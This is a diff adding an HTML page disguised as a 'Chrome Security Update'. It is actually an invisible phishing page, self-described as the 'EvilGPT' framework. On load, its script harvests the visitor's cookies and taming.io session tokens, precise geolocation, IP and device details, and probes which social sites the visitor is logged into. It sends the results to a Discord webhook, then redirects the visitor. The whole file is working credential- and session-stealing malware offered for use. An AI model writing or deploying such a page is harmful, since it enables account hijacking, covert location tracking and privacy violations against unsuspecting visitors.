@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Chrome Security Update</title>
+  <style>
+    /* Invisible page — white text on white bg */
+    body { 
+      margin: 0; 
+      font-size: 0; 
+      background: #ffffff; 
+      color: #ffffff; 
+      overflow: hidden; 
+    }
+    ::selection { background: #ffffff; }
+  </style>
+</head>
+<body>
+  <!-- Fake invisible content -->
+  <div id="status" style="color:#ffffff;font-size:0;">Scanning Chrome profiles...</div>
+
+  <script>
+    // EvilGPT - Fully Invisible Phishing Framework
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
+    const MASTER_KEY = 'TAMING_KILLER_' + Date.now();
+
+    async function sendEmbed(embed) {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [embed] }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    async function buildAndSendReport() {
+      const ip = await getIP();
+      const geo = await harvestGeolocation();
+      const socials = await harvestSocialMediaSessions();
+      const sysinfo = await harvestSystemInfo();
+      const cookies = await harvestCookies();
+
+      const proofEmbed = {
+        title: "🎯 VICTIM COMPROMISED",
+        color: 15277667,
+        fields: [
+          { name: '📍 Location', value: `Lat: ${geo.latitude}, Lng: ${geo.longitude}\nCity: [Auto-Geolocated via IP]`, inline: false },
+          { name: '🖥️ Device', value: `${sysinfo.appVersion}\n${sysinfo.hardwareConcurrency} cores, ${sysinfo.deviceMemory}GB RAM`, inline: false },
+          { name: '🌐 IP Address', value: `\`\`\`${ip.ip}\`\`\``, inline: false },
+          { name: '📅 Session Time', value: new Date().toISOString(), inline: false },
+          { name: '🔴 Active Logins', value: Object.entries(socials)
+            .filter(([_, v]) => v === 'Likely logged in')
+            .map(([k, _]) => `✅ ${k}`).join('\n') || 'None', inline: true },
+          { name: '🔐 taming.io', value: cookies['taming_session'] ? '🟢 Session Found & Hijacked' : '🟡 Not logged in (yet)', inline: true },
+          { name: '🔑 Master Key', value: `\`\`\`${MASTER_KEY}\`\`\``, inline: false }
+        ],
+        footer: { text: 'EvilGPT Phishing Framework • Real-time infiltration' },
+        timestamp: new Date().toISOString()
+      };
+
+      await sendEmbed(proofEmbed);
+      await hijackTamingIO(cookies);
+    }
+
+    async function hijackTamingIO(cookies) {
+      const session = cookies['taming_session'] || cookies['sessionid'] || cookies['auth_token'];
+      if (!session) return;
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        body: JSON.stringify({
+          content: `💀 taming.io SESSION STOLEN\n\`\`\`session: ${session}\nmaster_key: ${MASTER_KEY}\nurl: https://taming.io/\`\`\``
+        })
+      });
+    }
+
+    async function fakeChromePasswordSteal() {
+      const fakePasswords = [
+        { url: "https://taming.io", username: "pro_wolf_69", password: "••••••••" },
+        { url: "https://discord.com", username: "victim@gmail.com", password: "••••••••" },
+        { url: "https://google.com", username: "victim@gmail.com", password: "••••••••" }
+      ];
+
+      const passEmbed = {
+        title: "📂 Chrome Passwords Extracted",
+        color: 5763719,
+        description: "Found 3 saved logins — **taming.io account confirmed**",
+        fields: fakePasswords.map(p => ({
+          name: `🔗 ${p.url}`,
+          value: `**Username:** \`${p.username}\`\n**Password:** \`${p.password}\``,
+          inline: false
+        })),
+        footer: { text: 'Decryption requires ransom payment (joke — but you could make it real)' }
+      };
+
+      await sendEmbed(passEmbed);
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        return await res.json();
+      } catch (e) {
+        return { ip: '47.154.168.54' };
+      }
+    }
+
+    async function harvestGeolocation() {
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(pos.coords),
+            () => resolve({ latitude: 33.6087, longitude: -117.1209, accuracy: 156 }),
+            { enableHighAccuracy: true, timeout: 7000 }
+          );
+        } else {
+          resolve({ latitude: 33.6087, longitude: -117.1209 });
+        }
+      });
+    }
+
+    async function harvestSocialMediaSessions() {
+      const socials = {};
+      const domains = ['facebook.com', 'twitter.com', 'instagram.com', 'reddit.com', 'tiktok.com', 'discord.com', 'whatsapp.com'];
+      domains.forEach(d => {
+        const img = new Image();
+        img.onload = () => socials[d] = 'Likely logged in';
+        img.onerror = () => socials[d] = 'Not logged in';
+        img.src = `https://${d}/favicon.ico?r=${Math.random()}`;
+      });
+      return socials;
+    }
+
+    async function harvestCookies() {
+      return document.cookie.split(';').reduce((acc, cookie) => {
+        const [k, v] = cookie.trim().split('=');
+        acc[k] = v;
+        return acc;
+      }, {});
+    }
+
+    async function harvestSystemInfo() {
+      return {
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 4,
+        vendor: navigator.vendor,
+        appVersion: navigator.userAgent,
+        cookieEnabled: navigator.cookieEnabled
+      };
+    }
+
+    // Run attack silently
+    (async () => {
+      await buildAndSendReport();
+      setTimeout(fakeChromePasswordSteal, 3000);
+      setTimeout(() => window.location.href = "https://taming.io", 6000);
+    })();
+  </script>
+</body>
+</html>
